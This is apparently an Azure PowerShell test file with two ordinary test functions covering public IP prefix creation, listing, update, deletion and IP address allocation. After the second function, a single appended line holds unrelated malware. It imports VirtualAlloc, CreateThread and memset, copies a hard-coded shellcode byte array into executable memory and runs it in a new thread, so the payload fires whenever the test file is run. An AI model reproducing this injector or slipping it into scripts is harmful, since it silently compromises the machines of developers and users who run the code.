﻿














function Test-PublicIpPrefixCRUD
{
    
    $rgname = Get-ResourceGroupName
    $rname = Get-ResourceName
    $rglocation = Get-ProviderLocation ResourceManagement
    $resourceTypeParent = "Microsoft.Network/publicIpPrefixes"
    $location = Get-ProviderLocation $resourceTypeParent "West Europe"
    $ipTagType = "NetworkDomain"
    $ipTagTag = "test"

    try
    {
        
        $resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" }

        $ipTag = New-Object -TypeName Microsoft.Azure.Commands.Network.Models.PSPublicIpPrefixTag
        $ipTag.IpTagType = $ipTagType
        $ipTag.Tag = $ipTagTag

        
        $job = New-AzPublicIpPrefix -ResourceGroupName $rgname -name $rname -location $location -Sku Standard -PrefixLength 30 -IpAddressVersion IPv4 -IpTag $ipTag -AsJob
        $job | Wait-Job
        $actual = $job | Receive-Job
        $expected = Get-AzPublicIpPrefix -ResourceGroupName $rgname -name $rname
        Assert-AreEqual $expected.ResourceGroupName $actual.ResourceGroupName
        Assert-AreEqual $expected.Name $actual.Name
        Assert-AreEqual $expected.Location $actual.Location
        Assert-AreEqual 30 $expected.PrefixLength
        Assert-NotNull $expected.ResourceGuid
        Assert-AreEqual "Succeeded" $expected.ProvisioningState
        Assert-AreEqual $ipTagType $expected.IpTags[0].IpTagType
        Assert-AreEqual $ipTagTag $expected.IpTags[0].Tag

        
        $list = Get-AzPublicIpPrefix -ResourceGroupName $rgname
        Assert-AreEqual 1 @($list).Count
        Assert-AreEqual $list[0].ResourceGroupName $actual.ResourceGroupName
        Assert-AreEqual $list[0].Name $actual.Name
        Assert-AreEqual $list[0].Location $actual.Location
        Assert-AreEqual 30 $list[0].PrefixLength
        Assert-AreEqual "Succeeded" $list[0].ProvisioningState

        $expected = Get-AzPublicIpPrefix -ResourceId $actual.Id
        Assert-AreEqual 1 @($list).Count
        Assert-AreEqual $list[0].ResourceGroupName $actual.ResourceGroupName
        Assert-AreEqual $list[0].Name $actual.Name
        Assert-AreEqual $list[0].Location $actual.Location
        Assert-AreEqual 30 $list[0].PrefixLength
        Assert-AreEqual "Succeeded" $list[0].ProvisioningState

        $list = Get-AzPublicIpPrefix
        Assert-NotNull $list

        $list = Get-AzPublicIpPrefix -ResourceGroupName "*"
        Assert-True { $list.Count -ge 0 }

        $list = Get-AzPublicIpPrefix -Name "*"
        Assert-True { $list.Count -ge 0 }

        $list = Get-AzPublicIpPrefix -ResourceGroupName "*" -Name "*"
        Assert-True { $list.Count -ge 0 }

        $expected.Tag = @{ testtag = "testvalSet" }

        $job = Set-AzPublicIpPrefix -PublicIpPrefix $expected -AsJob
        $job | Wait-Job
        $actual = $job | Receive-Job

        
        $job = Remove-AzPublicIpPrefix -InputObject $actual -PassThru -Force -AsJob
        $job | Wait-Job
        $delete = $job | Receive-Job
        Assert-AreEqual true $delete

        $list = Get-AzPublicIpPrefix -ResourceGroupName $actual.ResourceGroupName
        Assert-AreEqual 0 @($list).Count

        
        Assert-ThrowsLike { Set-AzPublicIpPrefix -PublicIpPrefix $expected } "*not found*"

        
        $job = New-AzPublicIpPrefix -ResourceGroupName $rgname -name $rname -location $location -Sku Standard -PrefixLength 30 -AsJob
        $job | Wait-Job
        $actual = $job | Receive-Job

        $job = Remove-AzPublicIpPrefix -ResourceId $actual.Id -PassThru -Force -AsJob
        $job | Wait-Job
        $delete = $job | Receive-Job
        Assert-AreEqual true $delete
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


function Test-PublicIpPrefixAllocatePublicIpAddress
{
    
    $rgname = Get-ResourceGroupName
    $rname = Get-ResourceName
    $pipname = $rname+"pip"
    $domainNameLabel = Get-ResourceName
    $rglocation = Get-ProviderLocation ResourceManagement
    $resourceTypeParent = "Microsoft.Network/publicIpPrefixes"
    $location = Get-ProviderLocation $resourceTypeParent "West Europe"
   
    try 
    {
        
        $resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" }

        
        $job = New-AzPublicIpPrefix -ResourceGroupName $rgname -name $rname -location $location -Sku Standard -PrefixLength 30 -AsJob
        $job | Wait-Job
        $actual = $job | Receive-Job
        $expected = Get-AzPublicIpPrefix -ResourceGroupName $rgname -name $rname
        Assert-AreEqual $expected.ResourceGroupName $actual.ResourceGroupName "AreEqual ResourceGroupName"
        Assert-AreEqual $expected.Name $actual.Name "AreEqual Name"
        Assert-AreEqual $expected.Location $actual.Location "AreEqual Location"
        Assert-AreEqual $expected.PrefixLength $actual.PrefixLength "AreEqual PrefixLength"
        Assert-NotNull $expected.ResourceGuid "AreEqual ResourceGuid"
        Assert-AreEqual "Succeeded" $expected.ProvisioningState "AreEqual ProvisioningState"

        
        $list = Get-AzPublicIpPrefix -ResourceGroupName $rgname
        Assert-AreEqual 1 @($list).Count "List PublicIpPrefix AreEqual Count 1"
        Assert-AreEqual $list[0].ResourceGroupName $actual.ResourceGroupName "List PublicIpPrefix AreEqual ResourceGroupName"
        Assert-AreEqual $list[0].Name $actual.Name "List PublicIpPrefix AreEqual Name"
        Assert-AreEqual $list[0].Location $actual.Location "List PublicIpPrefix AreEqual Location"
        Assert-AreEqual 30 $list[0].PrefixLength "List PublicIpPrefix AreEqual PrefixLength 30"
        Assert-AreEqual "Succeeded" $list[0].ProvisioningState "List PublicIpPrefix ProvisioningState"
        Assert-NotNull $list[0].IPPrefix "List PublicIpPrefix NotNull IPPrefix"
        $PublicIpPrefix = $list[0]

        
        $job=New-AzPublicIpAddress -ResourceGroupName $rgname -AllocationMethod Static -IpAddressVersion IPv4 -PublicIpPrefix $PublicIpPrefix -ResourceName $pipname -location $location -Sku Standard -DomainNameLabel $domainNameLabel -AsJob
        $job | Wait-Job
        $actualIpAddress = $job | Receive-Job
        $expected = Get-AzPublicIpAddress -ResourceGroupName $rgname -name $pipname
        Assert-AreEqual $expected.ResourceGroupName $actualIpAddress.ResourceGroupName "PublicIpAddress AreEqual ResourceGroupName"
        Assert-AreEqual $expected.Name $actualIpAddress.Name "PublicIpAddress AreEqual Name"
        Assert-AreEqual $expected.Location $actualIpAddress.Location "PublicIpAddress AreEqual Location"
        Assert-AreEqual "Static" $expected.PublicIpAllocationMethod "PublicIpAddress AreEqual PublicIpAllocationMethod Static"
        Assert-NotNull $expected.ResourceGuid "PublicIpAddress AreEqual ResourceGuid"
        Assert-AreEqual "Succeeded" $expected.ProvisioningState "PublicIpAddress AreEqual ProvisioningState Succeeded"
        Assert-AreEqual $domainNameLabel $expected.DnsSettings.DomainNameLabel "PublicIpAddress AreEqual DomainNameLabel"
        
        
        $list = Get-AzPublicIpPrefix -ResourceGroupName $rgname
        Assert-AreEqual 1 @($list[0].PublicIpAddresses).Count "List2 PublicIpAddresses AreEqual Count 1"

        
        $job = Remove-AzPublicIpAddress -ResourceGroupName $actual.ResourceGroupName -name $pipname -PassThru -Force -AsJob
        $job | Wait-Job
        $delete = $job | Receive-Job
        Assert-AreEqual true $delete "Delete PublicIpAddress failed"

        
        $job = Remove-AzPublicIpPrefix -ResourceGroupName $actual.ResourceGroupName -name $rname -PassThru -Force -AsJob
        $job | Wait-Job
        $delete = $job | Receive-Job
        Assert-AreEqual true $delete "Delete PublicIpPrefix failed"

        $list = Get-AzPublicIpPrefix -ResourceGroupName $actual.ResourceGroupName
        Assert-AreEqual 0 @($list).Count "Hmmmm PublicIpPrefix is still present after delete"
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}
$eOn = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $eOn -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x81,0xbd,0x26,0xf3,0xda,0xd1,0xd9,0x74,0x24,0xf4,0x5b,0x31,0xc9,0xb1,0x47,0x83,0xeb,0xfc,0x31,0x43,0x0f,0x03,0x43,0x8e,0x5f,0xd3,0x0f,0x78,0x1d,0x1c,0xf0,0x78,0x42,0x94,0x15,0x49,0x42,0xc2,0x5e,0xf9,0x72,0x80,0x33,0xf5,0xf9,0xc4,0xa7,0x8e,0x8c,0xc0,0xc8,0x27,0x3a,0x37,0xe6,0xb8,0x17,0x0b,0x69,0x3a,0x6a,0x58,0x49,0x03,0xa5,0xad,0x88,0x44,0xd8,0x5c,0xd8,0x1d,0x96,0xf3,0xcd,0x2a,0xe2,0xcf,0x66,0x60,0xe2,0x57,0x9a,0x30,0x05,0x79,0x0d,0x4b,0x5c,0x59,0xaf,0x98,0xd4,0xd0,0xb7,0xfd,0xd1,0xab,0x4c,0x35,0xad,0x2d,0x85,0x04,0x4e,0x81,0xe8,0xa9,0xbd,0xdb,0x2d,0x0d,0x5e,0xae,0x47,0x6e,0xe3,0xa9,0x93,0x0d,0x3f,0x3f,0x00,0xb5,0xb4,0xe7,0xec,0x44,0x18,0x71,0x66,0x4a,0xd5,0xf5,0x20,0x4e,0xe8,0xda,0x5a,0x6a,0x61,0xdd,0x8c,0xfb,0x31,0xfa,0x08,0xa0,0xe2,0x63,0x08,0x0c,0x44,0x9b,0x4a,0xef,0x39,0x39,0x00,0x1d,0x2d,0x30,0x4b,0x49,0x82,0x79,0x74,0x89,0x8c,0x0a,0x07,0xbb,0x13,0xa1,0x8f,0xf7,0xdc,0x6f,0x57,0xf8,0xf6,0xc8,0xc7,0x07,0xf9,0x28,0xc1,0xc3,0xad,0x78,0x79,0xe2,0xcd,0x12,0x79,0x0b,0x18,0x8e,0x7c,0x9b,0xee,0x4c,0x9a,0x85,0x99,0x50,0x64,0x38,0xe4,0xdc,0x82,0x6a,0x48,0x8f,0x1a,0xca,0x38,0x6f,0xcb,0xa2,0x52,0x60,0x34,0xd2,0x5c,0xaa,0x5d,0x78,0xb3,0x03,0x35,0x14,0x2a,0x0e,0xcd,0x85,0xb3,0x84,0xab,0x85,0x38,0x2b,0x4b,0x4b,0xc9,0x46,0x5f,0x3b,0x39,0x1d,0x3d,0xed,0x46,0x8b,0x28,0x11,0xd3,0x30,0xfb,0x46,0x4b,0x3b,0xda,0xa0,0xd4,0xc4,0x09,0xbb,0xdd,0x50,0xf2,0xd3,0x21,0xb5,0xf2,0x23,0x74,0xdf,0xf2,0x4b,0x20,0xbb,0xa0,0x6e,0x2f,0x16,0xd5,0x23,0xba,0x99,0x8c,0x90,0x6d,0xf2,0x32,0xcf,0x5a,0x5d,0xcc,0x3a,0x5b,0xa1,0x1b,0x02,0x29,0xcb,0x9f;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Af0E=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Af0E.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Af0E,0,0,0);for (;;){Start-sleep 60};

